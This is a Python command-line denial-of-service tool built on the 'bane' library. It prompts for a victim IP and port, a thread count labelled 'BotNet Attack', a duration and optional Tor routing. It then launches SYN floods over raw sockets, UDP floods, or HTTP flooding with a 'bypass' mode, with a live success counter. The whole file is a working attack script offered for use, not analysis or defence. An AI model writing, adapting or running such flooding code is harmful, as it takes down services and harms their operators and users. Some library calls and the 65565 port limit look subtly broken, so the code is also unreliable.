import bane, sys, socket, time, threading
from concurrent.futures import ThreadPoolExecutor
from math import gcd  # Ensure gcd is imported from the math module

if sys.version_info < (3, 0):
    input = raw_input

def get_user_input(prompt, valid_condition, error_message):
    while True:
        try:
            value = input(prompt)
            if valid_condition(value):
                return value
        except:
            pass
        print(error_message)

def get_numeric_input(prompt, min_value, max_value):
    return int(get_user_input(
        prompt,
        lambda x: min_value <= int(x) <= max_value,
        f"Please enter a valid choice between {min_value} and {max_value}.."
    ))

def get_choice_input(prompt, choices):
    return get_user_input(
        prompt,
        lambda x: x.lower() in choices,
        f"Please enter a valid choice: {', '.join(choices)}.."
    ).lower()

# Get target IP address
target = get_user_input(
    bane.Fore.GREEN + '\nTarget IP address/ ' + bane.Fore.WHITE,
    lambda x: socket.gethostbyname(x),
    bane.Fore.RED + 'Please enter a valid choice..' + bane.Fore.WHITE
)

# Get port number
port = get_numeric_input(
    bane.Fore.GREEN + '\nPort victum (number between 1 - 65565) : ' + bane.Fore.WHITE,
    1, 65565
)

# Get number of threads
threads_count = get_numeric_input(
    bane.Fore.GREEN + '\nBotNet Attack (1 - 1000) : ' + bane.Fore.WHITE,
    1, 1000
)

# Get timeout value
timeout = get_numeric_input(
    bane.Fore.GREEN + '\nTimeout (number between 1 - 30) : ' + bane.Fore.WHITE,
    1, 30
)

# Get attack duration
duration = get_numeric_input(
    bane.Fore.GREEN + '\nBotNet Attack duration in seconds (number between 1 - 1000000) : ' + bane.Fore.WHITE,
    1, 1000000
)

# Check if stressing (Tor) is enabled
tor = get_choice_input(
    bane.Fore.GREEN + '\nIs Stressing enabled? (yes / no) : ' + bane.Fore.WHITE,
    ['yes', 'no', 'y', 'n']
) in ['yes', 'y']

# Choose attack method
method = get_numeric_input(
    bane.Fore.GREEN + '\nAttack method: \n\t1- Small attack \n\t2- Medium attack \n\t3- Ultra-high \n\t4- SYN flood \n\t5- UDP flood \n=>' + bane.Fore.WHITE,
    1, 5
)

# Enable bypass mode
spam_mode = get_choice_input(
    bane.Fore.GREEN + '\nDo you want to enable "bypass" mode? (yes / no) : ' + bane.Fore.WHITE,
    ['yes', 'no', 'y', 'n']
) in ['yes', 'y']

# Function to perform SYN flood attack
def syn_flood(target_ip, target_port, duration):
    client = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    client.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    timeout = time.time() + duration
    while time.time() < timeout:
        ip_header = bane.create_ip_header(target_ip)
        tcp_header = bane.create_tcp_header(target_ip, target_port)
        packet = ip_header + tcp_header
        client.sendto(packet, (target_ip, 0))

# Function to perform UDP flood attack
def udp_flood(target_ip, target_port, duration):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = bane.generate_payload(1024)
    timeout = time.time() + duration
    while time.time() < timeout:
        client.sendto(payload, (target_ip, target_port))

def monitor_attack(http_flooder_instance):
    while True:
        try:
            time.sleep(1)
            sys.stdout.write("\r{}Total: {} {}| {}Success => {} {}| {}Fails => {}{}".format(
                bane.Fore.BLUE,
                http_flooder_instance.counter + http_flooder_instance.fails,
                bane.Fore.WHITE,
                bane.Fore.GREEN,
                http_flooder_instance.counter,
                bane.Fore.WHITE,
                bane.Fore.RED,
                http_flooder_instance.fails,
                bane.Fore.RESET
            ))
            sys.stdout.flush()
            if http_flooder_instance.done():
                break
        except:
            break

if spam_mode:
    http_flooder_instance = bane.HTTP_Spam(target, p=port, timeout=timeout, threads=threads_count, duration=duration, tor=tor, logs=False, method=method)
else:
    if port == 443:
        target = "https://" + target + '/'
    else:
        target = "http://" + target + ':' + str(port) + '/'
    scrape_target = get_choice_input(
        bane.Fore.GREEN + '\nDo you want to scrape the target? (yes / no) : ' + bane.Fore.WHITE,
        ['yes', 'no', 'y', 'n']
    ) in ['yes', 'y']
    scraped_urls = 1
    if scrape_target:
        scraped_urls = get_numeric_input(
            bane.Fore.GREEN + '\nHow many URLs to collect? (between 1 - 20) : ' + bane.Fore.WHITE,
            1, 20
        )
    http_flooder_instance = bane.HTTP_Puncher(target, timeout=timeout, threads=threads_count, duration=duration, tor=tor, logs=False, method=method, scrape_target=scrape_target, scraped_urls=scraped_urls)

print(bane.Fore.RESET)

# Start the chosen attack method
if method == 4:
    with ThreadPoolExecutor(max_workers=threads_count) as executor:
        for _ in range(threads_count):
            executor.submit(syn_flood, target, port, duration)
elif method == 5:
    with ThreadPoolExecutor(max_workers=threads_count) as executor:
        for _ in range(threads_count):
            executor.submit(udp_flood, target, port, duration)
else:
    # For HTTP Spam or Puncher attacks
    with ThreadPoolExecutor(max_workers=threads_count) as executor:
        for _ in range(threads_count):
            executor.submit(http_flooder_instance.start)

# Monitor the attack
monitor_attack(http_flooder_instance)
